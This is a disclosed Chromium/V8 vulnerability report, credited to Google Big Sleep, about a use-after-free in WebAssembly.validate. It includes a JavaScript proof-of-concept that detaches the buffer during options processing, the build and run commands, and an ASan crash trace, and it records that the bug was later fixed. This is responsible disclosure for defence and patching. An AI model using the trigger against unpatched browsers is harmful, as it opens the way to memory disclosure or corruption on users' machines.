# 439771269

Issue URL: https://issuetracker.google.com/issues/439771269
VRP-Reward: INT
Date: Aug 19, 2025 07:10PM


_Publishing the original report in line with the disclosure policy._

* * *

We are tracking this issue with the public ID `BIGSLEEP-439771269`. Please use this identifier for reference in any future communication.

## **Vulnerability Details**

There is a use-after-free bug in the implementation of `WebAssembly.validate` [1]. This function:

  * first obtains the pointer to the ArrayBuffer contents to validate (line 896),
  * then processes the `options` parameter (line 910),
  * and finally calls into `WasmEngine::SyncValidate` to perform the actual validation (line 932).

The problem here is that a JavaScript callback can be triggered during the processing of the `options` argument, which can then detach the input ArrayBuffer. This in combination with a GC will effectively free the ArrayBuffer backing buffer, causing `SyncValidate` to operate on freed data.

This bug might allow an attacker to disclose memory contents in a limited way by observing the output of the validation. Furthermore, `WasmEngine::SyncValidate` might not be robust against concurrent modifications of the buffer (in case of a shared ArrayBuffer, the data is explicitly copied to avoid this [2]), which might allow an attacker to cause further memory corruption by re-allocating and modifying the freed ArrayBuffer from another thread.

[1] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-js.cc;l=890;drc=1a8fcda579513e60fd816de6685e3b122bd0804b](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-js.cc;l=890;drc=1a8fcda579513e60fd816de6685e3b122bd0804b>)  
[2] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-js.cc;l=920;drc=1a8fcda579513e60fd816de6685e3b122bd0804b](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-js.cc;l=920;drc=1a8fcda579513e60fd816de6685e3b122bd0804b>)

## **Affected Version(s)**

The issue has been successfully reproduced:

  * at HEAD (commit cda27e3cbf57d5eab628ea251d0bb3df15af92e2)
  * in stable release 13.9.205.16 (b07b4e9376489c7f7c0ff2af5eceb4261b3bb784)

## **Reproduction**

### **Test Case**

```
// Flags: --expose-gc
const buffer = new ArrayBuffer(100);
const options = new Proxy({}, {
    get(target, property, receiver) {
        if (property === 'builtins') {
            buffer.transfer();
            gc();
        }
    }
});
WebAssembly.validate(buffer, options);
```

### **Build Instructions**

Follow the instructions at [https://v8.dev/docs/build](<https://v8.dev/docs/build>). The crash was verified on a debug build with ASAN:

```
gm.py x64.debug
```

### **Command**

```
./out/x64.debug/d8 --expose-gc crash.js
```

### **ASan Report**

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==1198187==ERROR: AddressSanitizer: SEGV on unknown address 0x7a9400000000 (pc 0x7fd4f8e8e330 bp 0x7ffe34c5e240 sp 0x7ffe34c5d9f8 T0)
==1198187==The signal is caused by a READ memory access.
    #0 0x7fd4f8e8e330 in __memcpy_evex_unaligned_erms string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:287
    #1 0x7fd50918247d in unsigned int v8::base::ReadUnalignedValue<unsigned int>(unsigned long) src/base/memory.h:31:3
    #2 0x7fd509182454 in unsigned int v8::base::ReadLittleEndianValue<unsigned int>(unsigned long) src/base/memory.h:54:10
    #3 0x7fd509283970 in unsigned int v8::internal::wasm::Decoder::read_little_endian<unsigned int, v8::internal::wasm::Decoder::NoValidationTag>(unsigned char const*, char const*) src/wasm/decoder.h:470:12
    #4 0x7fd50948cc2e in unsigned int v8::internal::wasm::Decoder::consume_little_endian<unsigned int, (v8::internal::wasm::Decoder::TraceFlag)0>(char const*) src/wasm/decoder.h:481:19
    #5 0x7fd50948ca83 in v8::internal::wasm::Decoder::consume_u32(char const*, v8::internal::wasm::ITracer*) src/wasm/decoder.h:247:12
    #6 0x7fd50947cdca in v8::internal::wasm::ModuleDecoderImpl::DecodeModuleHeader(v8::base::Vector<unsigned char const>) src/wasm/module-decoder-impl.h:338:27
    #7 0x7fd50947c357 in v8::internal::wasm::ModuleDecoderImpl::DecodeModule(bool) src/wasm/module-decoder-impl.h:1955:5
    #8 0x7fd509474259 in v8::internal::wasm::DecodeWasmModule(v8::internal::wasm::WasmEnabledFeatures, v8::base::Vector<unsigned char const>, bool, v8::internal::wasm::ModuleOrigin, v8::internal::wasm::WasmDetectedFeatures*) src/wasm/module-decoder.cc:127:33
    #9 0x7fd509473bd5 in v8::internal::wasm::DecodeWasmModule(v8::internal::wasm::WasmEnabledFeatures, v8::base::Vector<unsigned char const>, bool, v8::internal::wasm::ModuleOrigin, v8::internal::Counters*, std::__Cr::shared_ptr<v8::internal::metrics::Recorder>, v8::metrics::Recorder::ContextId, v8::internal::wasm::DecodingMethod, v8::internal::wasm::WasmDetectedFeatures*) src/wasm/module-decoder.cc:93:7
    #10 0x7fd509656a7c in v8::internal::wasm::WasmEngine::SyncValidate(v8::internal::Isolate*, v8::internal::wasm::WasmEnabledFeatures, v8::internal::wasm::CompileTimeImports, v8::base::Vector<unsigned char const>) src/wasm/wasm-engine.cc:597:17
    #11 0x7fd509700b3a in v8::(anonymous namespace)::WebAssemblyValidateImpl(v8::FunctionCallbackInfo<v8::Value> const&) src/wasm/wasm-js.cc:932:43
    #12 0x7fd509700374 in v8::internal::wasm::WebAssemblyValidate(v8::FunctionCallbackInfo<v8::Value> const&) src/wasm/wasm-js.cc:3258:1
    #13 0x7fd503e9300f in Builtins_CallApiCallbackGeneric setup-isolate-deserialize.cc
    #14 0x7fd503e8f1b5 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #15 0x7fd503e82ce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #16 0x7fd503e82a2a in Builtins_JSEntry setup-isolate-deserialize.cc
    #17 0x7fd50598f0e6 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) src/execution/simulator.h:212:12
    #18 0x7fd505987619 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #19 0x7fd505988546 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #20 0x7fd504ca2387 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1964:7
    #21 0x7fd504ca1bad in v8::Script::Run(v8::Local<v8::Context>) src/api/api.cc:1928:10
    #22 0x564c7c931e35 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1035:44
    #23 0x564c7c96865b in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5354:10
    #24 0x564c7c9745f0 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6310:37
    #25 0x564c7c973e8e in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6218:18
    #26 0x564c7c976ccf in v8::Shell::Main(int, char**) src/d8/d8.cc:7103:18
    #27 0x564c7c977721 in main src/d8/d8.cc:7195:43
    #28 0x7fd4f8d43ca7 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
==1198187==Register values:
rax = 0x00007ffe34c5e254  rbx = 0x0000000000000000  rcx = 0x0000100046983c4a  rdx = 0x0000000000000000  
rdi = 0x00007ffe34c5e254  rsi = 0x00007a9400000000  rbp = 0x00007ffe34c5e240  rsp = 0x00007ffe34c5d9f8  
 r8 = 0x00000fffc698bc4a   r9 = 0x00007ffe34c5e257  r10 = 0x00000fffc698bc4a  r11 = 0x0000100046983c48  
r12 = 0x0000100046983c48  r13 = 0xffffffffffffffc3  r14 = 0x000000000003e000  r15 = 0x00007bd4f6cb1ea0  
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:287 in __memcpy_evex_unaligned_erms
==1198187==ABORTING
```

## **Reporter Credit**

Google Big Sleep

## **Disclosure Policy**

This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is 2025-11-17.

For more information, visit [https://goo.gle/bigsleep](<https://goo.gle/bigsleep>)


---

**#2 — gl...@google.com — Oct 21, 2025 05:34PM**

Fixed in: [https://chromereleases.googleblog.com/2025/09/stable-channel-update-for-desktop_30.html](<https://chromereleases.googleblog.com/2025/09/stable-channel-update-for-desktop_30.html>)
